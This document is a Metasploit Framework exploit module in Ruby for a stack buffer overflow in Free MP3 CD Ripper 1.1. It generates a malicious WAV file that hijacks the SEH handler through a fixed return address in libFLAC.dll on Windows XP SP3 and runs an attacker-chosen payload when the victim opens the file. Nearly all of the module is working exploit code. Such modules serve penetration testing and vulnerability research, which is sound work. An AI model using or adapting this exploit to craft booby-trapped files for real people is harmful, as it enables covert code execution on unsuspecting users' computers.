##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Free MP3 CD Ripper 1.1 (WAV File) Stack Buffer Overflow',
			'Description'    => %q{ 
					This module exploits a stack based buffer overflow found in Free MP3 CD
				Ripper 1.1.  The overflow is triggered when an unsuspecting user opens a malicious
				WAV file.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Richard Leahy',    # Initial discovery
					'X-h4ck',           # msf module is based on his poc
					'Tiago Henriques',  # msf module
					'James Fitts'       # clean ups
				],
			'References'     =>
				[
					[ 'OSVDB', '63349' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/11975' ], #Initial disclosure
					[ 'URL', 'http://www.exploit-db.com/exploits/17727/' ] #This exploit is based on this poc
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
					'DisableNops' => 'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP3 EN',
						{ 
							'Ret' => 0x1001860b, # p/p/r in libFLAC.dll
							'Offset' => 4116
						} 
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 27 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.wav']),
			], self.class)
	end

	def exploit

		wav = Metasm::Shellcode.assemble(Metasm::Ia32.new, "inc ecx").encode_string * 100
		wav << payload.encoded
		wav << rand_text_alpha_upper(target['Offset'] - (100 + payload.encoded.length))
		wav << generate_seh_record(target.ret)
		wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, "inc ecx").encode_string * 4
		wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-4050").encode_string

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(wav)

	end

end
